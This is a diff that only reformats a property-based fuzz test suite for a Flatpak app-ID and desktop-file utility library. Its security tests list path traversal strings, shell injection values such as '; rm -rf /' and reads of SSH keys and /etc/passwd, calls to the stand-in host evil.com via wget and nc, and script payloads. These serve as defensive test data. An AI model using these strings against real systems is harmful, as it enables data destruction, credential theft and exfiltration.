@@ -66,6 +66,7 @@ from lib.paths import (
 # Strategy Definitions
 # =============================================================================
 
+
 @composite
 def flatpak_id_strategy(draw, min_size: int = 1, max_size: int = 200) -> str:
     """Generate valid Flatpak IDs plus potential edge cases."""
@@ -130,7 +131,10 @@ def path_traversal_attempt_strategy(draw) -> str:
         return traversals[choice]
 
     # Generate random traversal
-    parts = [draw(sampled_from(["..", "....", ".", "A", "B"])) for _ in range(draw(integers(min_value=1, max_value=5)))]
+    parts = [
+        draw(sampled_from(["..", "....", ".", "A", "B"]))
+        for _ in range(draw(integers(min_value=1, max_value=5)))
+    ]
     sep = draw(sampled_from(["/", "\\", "//", "\\\\"]))
     return sep.join(parts) + sep + "etc"
 
@@ -204,13 +208,18 @@ def desktop_content_strategy(draw) -> tuple[str, str]:
     choice = draw(integers(min_value=0, max_value=12))
 
     if choice == 0:
-        return ("minimal.desktop", """[Desktop Entry]
+        return (
+            "minimal.desktop",
+            """[Desktop Entry]
 Name=Test App
 Exec=/usr/bin/test
-""")
+""",
+        )
 
     elif choice == 1:
-        return ("full.desktop", """[Desktop Entry]
+        return (
+            "full.desktop",
+            """[Desktop Entry]
 Type=Application
 Name=Firefox Web Browser
 Name[en_US]=Firefox
@@ -224,25 +233,34 @@ Terminal=false
 Categories=Network;WebBrowser;
 StartupNotify=true
 StartupWMClass=Firefox
-""")
+""",
+        )
 
     elif choice == 2:
-        return ("unicode.desktop", """[Desktop Entry]
+        return (
+            "unicode.desktop",
+            """[Desktop Entry]
 Name=テストアプリケーション
 Name[en_US]=Test Application
 Comment=コメント
 Exec=/usr/bin/test
-""")
+""",
+        )
 
     elif choice == 3:
-        return ("special_chars.desktop", """[Desktop Entry]
+        return (
+            "special_chars.desktop",
+            """[Desktop Entry]
 Name=<Test & "App">
 Exec='/path/with spaces/test' --flag="value"
 Comment=Test & "Special" <Characters>
-""")
+""",
+        )
 
     elif choice == 4:
-        return ("empty_sections.desktop", """[Desktop Entry]
+        return (
+            "empty_sections.desktop",
+            """[Desktop Entry]
 
 [Another Section]
 
@@ -253,21 +271,28 @@ Value=Content
 [Empty]
 # Just a comment
 
-""")
+""",
+        )
 
     elif choice == 5:
-        return ("flatpak.desktop", """[Desktop Entry]
+        return (
+            "flatpak.desktop",
+            """[Desktop Entry]
 Type=Application
 Name=Test Flatpak App
 X-Flatpak=com.example.TestApp
 Exec=flatpak run com.example.TestApp
-""")
+""",
+        )
 
     elif choice == 6:
-        return ("no_newline.desktop", """[Desktop Entry]
+        return (
+            "no_newline.desktop",
+            """[Desktop Entry]
 Name=NoFinalNewline
 Exec=test
-NoDisplay=true""")
+NoDisplay=true""",
+        )
 
     elif choice == 7:
         return ("binary_junk.desktop", "[Desktop Entry]\nName=Test\x00\x01\x02\nExec=test\n")
@@ -276,17 +301,23 @@ NoDisplay=true""")
         return ("very_long.desktop", "[Desktop Entry]\n" + "X-Custom=" + "A" * 10000 + "\n")
 
     elif choice == 9:
-        return ("missing_equals.desktop", """[Desktop Entry]
+        return (
+            "missing_equals.desktop",
+            """[Desktop Entry]
 Name
 Exec=/test
-""")
+""",
+        )
 
     elif choice == 10:
-        return ("malformed_sections.desktop", """[[Desktop Entry]]
+        return (
+            "malformed_sections.desktop",
+            """[[Desktop Entry]]
 Name=Test
 ]Another[
 Exec=test
-[""")
+[""",
+        )
 
     else:
         # Generate random content
@@ -294,11 +325,21 @@ Exec=test
         sections = []
         valid_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
         for _ in range(num_sections):
-            section_name = "".join([draw(sampled_from(list(valid_chars))) for _ in range(draw(integers(min_value=1, max_value=20)))])
+            section_name = "".join(
+                [
+                    draw(sampled_from(list(valid_chars)))
+                    for _ in range(draw(integers(min_value=1, max_value=20)))
+                ]
+            )
             num_keys = draw(integers(min_value=1, max_value=10))
             keys = []
             for _ in range(num_keys):
-                key = "".join([draw(sampled_from(list(valid_chars))) for _ in range(draw(integers(min_value=1, max_value=20)))])
+                key = "".join(
+                    [
+                        draw(sampled_from(list(valid_chars)))
+                        for _ in range(draw(integers(min_value=1, max_value=20)))
+                    ]
+                )
                 value_len = draw(integers(min_value=0, max_value=100))
                 value = "".join([draw(sampled_from(list(valid_chars))) for _ in range(value_len)])
                 keys.append(f"{key}={value}")
@@ -309,6 +350,7 @@ Exec=test
 # =============================================================================
 # Validation Module Tests
 # =============================================================================
+
 
 class TestValidationFuzz:
     """Fuzz tests for lib/validation.py"""
@@ -386,6 +428,7 @@ class TestValidationFuzz:
 # Safety Module Tests
 # =============================================================================
 
+
 class TestSafetyFuzz:
     """Fuzz tests for lib/safety.py"""
 
@@ -436,6 +479,7 @@ class TestSafetyFuzz:
 # Python Utils Module Tests
 # =============================================================================
 
+
 class TestPythonUtilsFuzz:
     """Fuzz tests for lib/python_utils.py"""
 
@@ -467,8 +511,9 @@ class TestPythonUtilsFuzz:
         """Test that sanitize_id_to_name respects the 100 character limit."""
         try:
             result = sanitize_id_to_name(id_str)
-            assert len(result) <= 100 or result.startswith("app-"), \
+            assert len(result) <= 100 or result.startswith("app-"), (
                 f"sanitize_id_to_name exceeded length limit: {len(result)} chars"
+            )
         except Exception as e:
             pytest.fail(f"sanitize_id_to_name length check failed: {e}")
 
@@ -529,17 +574,20 @@ class TestPythonUtilsFuzz:
 # Desktop Parser Module Tests
 # =============================================================================
 
+
 class TestDesktopParserFuzz:
     """Fuzz tests for lib/desktop_parser.py"""
 
     @given(content_data=desktop_content_strategy())
-    @settings(max_examples=30, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture])
+    @settings(
+        max_examples=30, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture]
+    )
     def test_desktop_entry_parse_no_crash(self, content_data: tuple, tmp_path: Path) -> None:
         """Test that DesktopEntry parsing doesn't crash on malformed files."""
         filename, content = content_data
         try:
             test_file = tmp_path / filename
-            test_file.write_bytes(content.encode('utf-8', errors='replace'))
+            test_file.write_bytes(content.encode("utf-8", errors="replace"))
 
             entry = DesktopEntry(test_file)
 
@@ -556,13 +604,15 @@ class TestDesktopParserFuzz:
             pytest.fail(f"DesktopEntry crashed on {filename!r}: {e}")
 
     @given(content_data=desktop_content_strategy())
-    @settings(max_examples=30, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture])
+    @settings(
+        max_examples=30, deadline=15000, suppress_health_check=[HealthCheck.function_scoped_fixture]
+    )
     def test_desktop_entry_properties(self, content_data: tuple, tmp_path: Path) -> None:
         """Test DesktopEntry property access on various content."""
         filename, content = content_data
         test_file = tmp_path / filename
         try:
-            test_file.write_bytes(content.encode('utf-8', errors='replace'))
+            test_file.write_bytes(content.encode("utf-8", errors="replace"))
             entry = DesktopEntry(test_file)
 
             name = entry.name
@@ -593,7 +643,9 @@ class TestDesktopParserFuzz:
             pytest.fail(f"DesktopEntry properties failed: {e}")
 
     @given(key=text(min_size=0, max_size=50), value=text(min_size=0, max_size=200))
-    @settings(max_examples=30, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
+    @settings(
+        max_examples=30, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture]
+    )
     def test_desktop_entry_get_method(self, key: str, value: str, tmp_path: Path) -> None:
         """Test DesktopEntry.get() with various keys and values."""
         test_file = tmp_path / "test.desktop"
@@ -623,7 +675,9 @@ class TestDesktopParserFuzz:
             pytest.fail(f"get_app_metadata crashed on {flatpak_id!r}: {e}")
 
     @given(directory=text(min_size=0, max_size=200))
-    @settings(max_examples=50, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
+    @settings(
+        max_examples=50, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture]
+    )
     def test_find_desktop_files_no_crash(self, directory: str, tmp_path: Path) -> None:
         """Test that find_desktop_files doesn't crash on invalid directories."""
         try:
@@ -637,6 +691,7 @@ class TestDesktopParserFuzz:
 # =============================================================================
 # Paths Module Tests
 # =============================================================================
+
 
 class TestPathsFuzz:
     """Fuzz tests for lib/paths.py"""
@@ -693,7 +748,9 @@ class TestPathsFuzz:
             pytest.fail(f"resolve_bin_dir crashed on {explicit_dir!r}: {e}")
 
     @given(path_input=one_of(text(min_size=0, max_size=500), none()))
-    @settings(max_examples=50, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture])
+    @settings(
+        max_examples=50, deadline=10000, suppress_health_check=[HealthCheck.function_scoped_fixture]
+    )
     def test_ensure_dir_no_crash(self, path_input, tmp_path: Path) -> None:
         """Test that ensure_dir doesn't crash on various paths."""
         if path_input is None:
@@ -713,19 +770,24 @@ class TestPathsFuzz:
 # Security Tests
 # =============================================================================
 
+
 class TestSecurityFuzz:
     """Security-focused fuzz tests."""
 
-    @given(id_str=one_of(
-        sampled_from([
-            "../../etc/passwd",
-            "../../../",
-            "..\\..\\..\\windows\\system32",
-            "\x00..\x00..",
-            "....//....//etc/shadow",
-        ]),
-        path_traversal_attempt_strategy(),
-    ))
+    @given(
+        id_str=one_of(
+            sampled_from(
+                [
+                    "../../etc/passwd",
+                    "../../../",
+                    "..\\..\\..\\windows\\system32",
+                    "\x00..\x00..",
+                    "....//....//etc/shadow",
+                ]
+            ),
+            path_traversal_attempt_strategy(),
+        )
+    )
     @settings(max_examples=50, deadline=5000)
     def test_sanitize_id_rejects_traversal(self, id_str: str) -> None:
         """Test that sanitize_id_to_name doesn't allow path traversal in output."""
@@ -737,20 +799,24 @@ class TestSecurityFuzz:
         except Exception as e:
             pytest.fail(f"sanitize_id_to_name security check failed: {e}")
 
-    @given(input_str=one_of(
-        sampled_from([
-            "$(whoami)",
-            "`id`",
-            "${HOME}/.ssh/id_rsa",
-            "&& cat /etc/passwd",
-            "; rm -rf /",
-            "|| wget evil.com",
-            "| nc evil.com 80",
-            "<script>alert(1)</script>",
-            "javascript:alert(1)",
-        ]),
-        special_string_strategy(min_size=10, max_size=200),
-    ))
+    @given(
+        input_str=one_of(
+            sampled_from(
+                [
+                    "$(whoami)",
+                    "`id`",
+                    "${HOME}/.ssh/id_rsa",
+                    "&& cat /etc/passwd",
+                    "; rm -rf /",
+                    "|| wget evil.com",
+                    "| nc evil.com 80",
+                    "<script>alert(1)</script>",
+                    "javascript:alert(1)",
+                ]
+            ),
+            special_string_strategy(min_size=10, max_size=200),
+        )
+    )
     @settings(max_examples=50, deadline=5000)
     def test_sanitize_string_injection_resistance(self, input_str: str) -> None:
         """Test that sanitize_string properly escapes injection attempts."""
@@ -768,26 +834,31 @@ class TestSecurityFuzz:
             result = validate_home_dir(path_input)
             if result:
                 home = str(Path.home())
-                assert result.startswith(home), \
+                assert result.startswith(home), (
                     f"validate_home_dir allowed path outside HOME: {result}"
+                )
         except Exception:
             pass
 
-    @given(app_id=one_of(
-        sampled_from([
-            ".hidden.app",
-            "hidden.app.",
-            "org..mozilla..firefox",
-            "org.mozilla..firefox",
-            "org...mozilla.firefox",
-            "123start.app",
-            "-start.app",
-            "_start.app",
-            "org.mozilla.firefox/",
-            "org.mozilla/firefox",
-        ]),
-        text(min_size=0, max_size=100),
-    ))
+    @given(
+        app_id=one_of(
+            sampled_from(
+                [
+                    ".hidden.app",
+                    "hidden.app.",
+                    "org..mozilla..firefox",
+                    "org.mozilla..firefox",
+                    "org...mozilla.firefox",
+                    "123start.app",
+                    "-start.app",
+                    "_start.app",
+                    "org.mozilla.firefox/",
+                    "org.mozilla/firefox",
+                ]
+            ),
+            text(min_size=0, max_size=100),
+        )
+    )
     @settings(max_examples=50, deadline=5000)
     def test_validate_app_id_security_checks(self, app_id: str) -> None:
         """Test that validate_app_id enforces security rules."""
@@ -805,18 +876,22 @@ class TestSecurityFuzz:
         except Exception as e:
             pytest.fail(f"validate_app_id security check failed: {e}")
 
-    @given(flatpak_id=one_of(
-        sampled_from([
-            ".hidden",
-            "hidden.",
-            "no.dot",
-            "123start",
-            "-start",
-            "_start",
-            "",
-        ]),
-        text(min_size=0, max_size=100),
-    ))
+    @given(
+        flatpak_id=one_of(
+            sampled_from(
+                [
+                    ".hidden",
+                    "hidden.",
+                    "no.dot",
+                    "123start",
+                    "-start",
+                    "_start",
+                    "",
+                ]
+            ),
+            text(min_size=0, max_size=100),
+        )
+    )
     @settings(max_examples=50, deadline=5000)
     def test_validate_flatpak_id_security(self, flatpak_id: str) -> None:
         """Test that validate_flatpak_id enforces security rules."""
@@ -835,6 +910,7 @@ class TestSecurityFuzz:
 # =============================================================================
 # Environment Tests
 # =============================================================================
+
 
 class TestEnvironmentFuzz:
     """Tests for environment-dependent functions."""
@@ -856,6 +932,7 @@ class TestEnvironmentFuzz:
 # Edge Case Tests
 # =============================================================================
 
+
 class TestEdgeCases:
     """Tests for extreme edge cases."""
 
@@ -876,16 +953,18 @@ class TestEdgeCases:
     def test_binary_data(self, value: bytes) -> None:
         """Test that functions handle binary data gracefully."""
         try:
-            str_value = value.decode('utf-8', errors='replace')
+            str_value = value.decode("utf-8", errors="replace")
             sanitize_string(str_value)
             sanitize_id_to_name(str_value)
         except Exception as e:
             pytest.fail(f"Function crashed on binary data: {e}")
 
-    @given(value=one_of(
-        sampled_from(["\u0000", "\uffff", "\U0001f600", "\U0001f4bb", "\U000fefff"]),
-        text(min_size=1, max_size=10),
-    ))
+    @given(
+        value=one_of(
+            sampled_from(["\u0000", "\uffff", "\U0001f600", "\U0001f4bb", "\U000fefff"]),
+            text(min_size=1, max_size=10),
+        )
+    )
     @settings(max_examples=50, deadline=5000)
     def test_unicode_edge_cases(self, value: str) -> None:
         """Test functions with unicode edge cases."""
@@ -895,14 +974,16 @@ class TestEdgeCases:
         except Exception as e:
             pytest.fail(f"Function crashed on unicode edge case: {value!r}: {e}")
 
-    @given(samples=lists(
-        one_of(
-            text(min_size=0, max_size=100),
-            sampled_from(["", "   ", "\t", "\n", "\r\n"]),
-        ),
-        min_size=0,
-        max_size=100,
-    ))
+    @given(
+        samples=lists(
+            one_of(
+                text(min_size=0, max_size=100),
+                sampled_from(["", "   ", "\t", "\n", "\r\n"]),
+            ),
+            min_size=0,
+            max_size=100,
+        )
+    )
     @settings(max_examples=50, deadline=10000)
     def test_repeated_empty_strings(self, samples: list) -> None:
         """Test that functions handle repeated empty/whitespace strings."""
